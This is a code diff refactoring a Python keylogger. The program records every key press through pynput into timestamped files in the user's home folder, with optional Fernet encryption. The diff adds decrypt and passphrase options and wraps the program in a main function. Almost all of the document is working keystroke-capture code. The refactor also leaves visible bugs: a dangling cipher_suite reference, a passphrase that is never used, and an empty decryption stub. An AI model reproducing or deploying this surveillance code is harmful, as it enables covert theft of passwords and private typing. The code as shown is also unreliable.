@@ -5,6 +5,7 @@ from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
 import platform
 import subprocess
+import getpass
 
 def get_keyboard_layout_name():
     system = platform.system()
@@ -35,34 +36,26 @@ def get_keyboard_layout_name():
     else:
         return "Unknown"
 
-keyboard_layout = get_keyboard_layout_name()
-print(f"Keyboard Layout: {keyboard_layout}")
-
 # Function to parse command-line arguments
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Keylogger with log file encryption.")
     parser.add_argument("--encrypt", action="store_true", help="Enable log file encryption.")
+    parser.add_argument("--decrypt", action="store_true", help="Enable log file decryption.")
+    parser.add_argument("--passphrase", type=str, help="Specify the encryption passphrase.")
     return parser.parse_args()
-
-# Parse command-line arguments
-args = parse_arguments()
-
-# Define the folder name and create it in the user's home directory
-log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
-os.makedirs(log_folder, exist_ok=True)
 
 # Generate a timestamp for the log file
 def get_timestamp():
- return time.strftime("%Y-%m-%d_%H-%M-%S")
+    return time.strftime("%Y-%m-%d_%H-%M-%S")
 
 # Define a function to create a new log_file
-def create_new_log_file():
+def create_new_log_file(log_folder):
     timestamp = get_timestamp()
     log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
     return log_filename
 
 # Define a function to write the key presses to a log file.
-def write_to_log(log_file, key):
+def write_to_log(log_file, key, cipher_suite):
     if hasattr(key, "name"):
         key_str = f"[{key.name}]"
     else:
@@ -77,16 +70,6 @@ def write_to_log(log_file, key):
 
     log_file.flush()
 
-current_log_file = open(create_new_log_file(), "a")
-
-# Generate an encryption key and initialize the Fernet cipher
-encryption_key = None
-cipher_suite = None
-
-if args.encrypt:
-    encryption_key = Fernet.generate_key()
-    cipher_suite = Fernet(encryption_key)
-
 # Create a function to encrypt and write data to the log file
 def encrypt_and_write(log_file, data):
     if cipher_suite:
@@ -96,14 +79,62 @@ def encrypt_and_write(log_file, data):
         write_to_log(log_file, data)
     log_file.flush()
 
+# Function to decrypt encrypted log files
+def decrypt_log_files(passphrase):
+    # TODO: Implement this function
+    pass
+
+# Function to securely obtain a passphrase from the user
+def get_passphrase():
+    passphrase = getpass.getpass("Enter an encryption passphrase: ")
+    return passphrase
+
 # Define a function that listens for key presses and writes them to the log file.
-def on_key_press(key):
+def on_key_press(key, log_file, args, cipher_suite):
     if key == Key.esc:
-        # Stop keylogger
+        log_file.close()
         return False
+    if args.encrypt:
+        write_to_log(log_file, key, cipher_suite)
+    else:
+        write_to_log(log_file, key, None)
 
-    write_to_log(current_log_file, key)
+def main():
+    # Parse command-line arguments
+    args = parse_arguments()
 
-# Set up the keylogger
-with Listener(on_press=on_key_press) as listener:
-    listener.join()
+    # Define the folder name and create it in the user's home directory
+    log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
+    os.makedirs(log_folder, exist_ok=True)
+
+    keyboard_layout = get_keyboard_layout_name()
+    print(f"Keyboard Layout: {keyboard_layout}")
+
+    current_log_file = open(create_new_log_file(log_folder), "a")
+
+    # Generate an encryption key and initialize the Fernet cipher
+    encryption_key = None
+    cipher_suite = None
+
+    if args.encrypt:
+        encryption_key = Fernet.generate_key()
+        cipher_suite = Fernet(encryption_key)
+
+        if args.passphrase:
+            passphrase = args.passphrase
+        else:
+            passphrase = get_passphrase()
+
+    if args.decrypt:
+        if not args.passphrase:
+            print("Error: Decryption requires a passphrase. Use the --passphrase flag to specify the passphrase.")
+            return
+        decrypt_log_files(args.passphrase)
+        return
+
+    # Set up the keylogger
+    with Listener(on_press=lambda key: on_key_press(key, current_log_file, args, cipher_suite)) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
